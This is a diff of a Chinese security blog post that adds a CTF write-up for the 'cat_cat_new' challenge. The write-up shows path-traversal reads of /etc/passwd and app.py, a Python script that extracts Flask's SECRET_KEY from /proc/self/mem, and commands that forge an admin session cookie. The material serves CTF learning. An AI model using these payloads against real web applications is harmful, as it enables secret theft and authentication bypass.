@@ -248,7 +248,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ff7d73">文件包含</a>
+                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00bcd4">文件包含</a>
             </span>
             
         </span>
@@ -262,7 +262,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.5k字</span>
+        <span class="post-count">2.2k字</span>
       </span>
     </span>
 
@@ -271,7 +271,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">8分</span>
       </span>
     </span>
     
@@ -355,7 +355,7 @@
 </blockquote>
 <p>但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合<code>/proc/self/maps</code>中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。这里其实接近webpwn了</p>
 <p>这个单独拉出来讲，在2022年的<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1760">蓝帽杯初赛file_session</a>中出现过这个考点</p>
-<p>我们知道像flask框架中的<code>SECRET_KEY</code>本质上还是一个全局变量，而这些全局变量必定要被存放起来，存放的位置就是在内存中</p>
+<p>我们知道像flask框架中的<code>SECRET_KEY</code>本质上还是一个<strong>全局变量</strong>，而这些全局变量必定要被存放起来，存放的位置就是在内存中</p>
 <p>那么就需要通过&#x2F;proc读取内存，计算内存偏移得到我们需要的内容</p>
 <p>流程：先去读取&#x2F;proc&#x2F;self&#x2F;maps的信息 ，然后通过map里栈的地址 ，再去正则匹配里面的信息，然后再根据读出来的地址查mem内存 ，接着通过地址范围正则匹配我们需要的key</p>
 <p>exp：</p>
@@ -380,7 +380,110 @@ b <span class="token operator">=</span> maps<span class="token punctuation">.</s
             <span class="token keyword">print</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="攻防世界-cat-cat-new"><a href="#攻防世界-cat-cat-new" class="headerlink" title="攻防世界-cat_cat_new"></a>攻防世界-cat_cat_new</h3><p>咕咕咕</p>
+<hr>
+<h3 id="攻防世界-cat-cat-new"><a href="#攻防世界-cat-cat-new" class="headerlink" title="攻防世界-cat_cat_new"></a>攻防世界-cat_cat_new</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/niyani/p/17074125.html">https://www.cnblogs.com/niyani/p/17074125.html</a></p>
+<p>进入题目，随便点开一只猫猫的介绍</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517222809706.png" alt="image-20240517222809706"></p>
+<p>发现存在任意文件读取，尝试读取&#x2F;etc&#x2F;passwd</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517222941382.png" alt="image-20240517222941382"></p>
+<p>测试发现得用相对路径读</p>
+<p>用<code>../../../proc/self/cmdline</code>读一下当前命令行参数</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517223419055.png" alt="image-20240517223419055"></p>
+<p>可知起web服务的文件是app.py，翻目录读一下，位置在<code>../app.py</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> uuid
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> Markup
+<span class="token keyword">from</span> cat <span class="token keyword">import</span> cat
+
+flag <span class="token operator">=</span> <span class="token string">""</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>
+    __name__<span class="token punctuation">,</span>
+    static_url_path<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">,</span>
+    static_folder<span class="token operator">=</span><span class="token string">'static'</span>
+<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"*abcdefgh"</span>
+<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    flag <span class="token operator">=</span> cat<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    detailtxt <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./details/'</span><span class="token punctuation">)</span>
+    cats_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> detailtxt<span class="token punctuation">:</span>
+        cats_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> cats_list<span class="token operator">=</span>cats_list<span class="token punctuation">,</span> cat<span class="token operator">=</span>cat<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    filename <span class="token operator">=</span> <span class="token string">"./details/"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+    start <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+    end <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"detail.html"</span><span class="token punctuation">,</span> catname<span class="token operator">=</span>name<span class="token punctuation">,</span> info<span class="token operator">=</span>cat<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">admin_can_list_root</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flag
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">return</span> <span class="token string">"NoNoNo"</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5637</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>debug关了，flag文件在导入到python上下文后就给删了</p>
+<p>看一下获取flag的条件，&#x2F;admin路由下伪造session为admin即可得到flag</p>
+<p>而key的生成是随机的：<code>app.config[&#39;SECRET_KEY&#39;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;</code></p>
+<p>但是 secret_key 的值可以通过内存数据获取：</p>
+<p>首先读取<code>../../../proc/self/maps</code>获取可读内容的内存映射地址</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517224456915.png" alt="image-20240517224456915"></p>
+<p>然后结合地址读取<code>../../../proc/self/mem</code>的内存数据</p>
+<p>exp：1.txt为读出来的地址内容</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> requests
+
+maps <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span>
+b <span class="token operator">=</span> maps<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token builtin">list</span> <span class="token operator">=</span> b<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'rw'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
+        addr <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'([0-9a-f]+)-([0-9a-f]+)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>
+        <span class="token comment">#正则匹配地址,地址格式为十六进制数[0-9a-f],reserch会返回一个re.Match对象，用括号括起来是为了使用group()处理返回结果。</span>
+        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#将十六进制字符转化为十进制数，为了符合start参数格式参考链接</span>
+        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#将十六进制字符转化为十进制数，为了符合end参数格式</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span>
+        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://61.147.171.105:52840/info?file=../../../proc/self/mem&amp;start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start<span class="token punctuation">&#125;</span></span><span class="token string">&amp;end=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>end<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+        <span class="token comment">#使用start和end参数读取mem</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        secret_key <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>
+            <span class="token string">"[a-z0-9]&#123;32&#125;\*abcdefgh"</span><span class="token punctuation">,</span>
+            response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#uuid4()生成的字符串除去-符号后为固定的32字节（128bit），find</span>
+        <span class="token keyword">if</span> secret_key<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225110139.png" alt="image-20240517225110139"></p>
+<p>得到key：<code>ba0c7fc2975143f483e2a7b446bc0d4d*abcdefgh</code></p>
+<p>我们尝试读一下最后的参数看看内容：<code>?file=../../../proc/self/mem&amp;start=140125915090944&amp;end=140125916344320</code></p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225148223.png" alt="image-20240517225148223"></p>
+<p>可以看到全局变量 secret_key 就在这里面</p>
+<p>接下来拿着key去伪造session即可，访问&#x2F;admin拿到session：<code>eyJhZG1pbiI6MH0.ZkdvPQ.2tiKlO-NZWGbWTKmCCyOwpHVM9M</code></p>
+<p>进行伪造</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py decode <span class="token parameter variable">-s</span> <span class="token string">"ba0c7fc2975143f483e2a7b446bc0d4d*abcdefgh"</span> <span class="token parameter variable">-c</span> <span class="token string">"eyJhZG1pbiI6MH0.ZkdvPQ.2tiKlO-NZWGbWTKmCCyOwpHVM9M"</span>
+
+python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"ba0c7fc2975143f483e2a7b446bc0d4d*abcdefgh"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'admin':1&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225845389.png" alt="image-20240517225845389"></p>
+<p>得到flag</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517225956666.png" alt="image-20240517225956666"></p>
 
     </div>
     
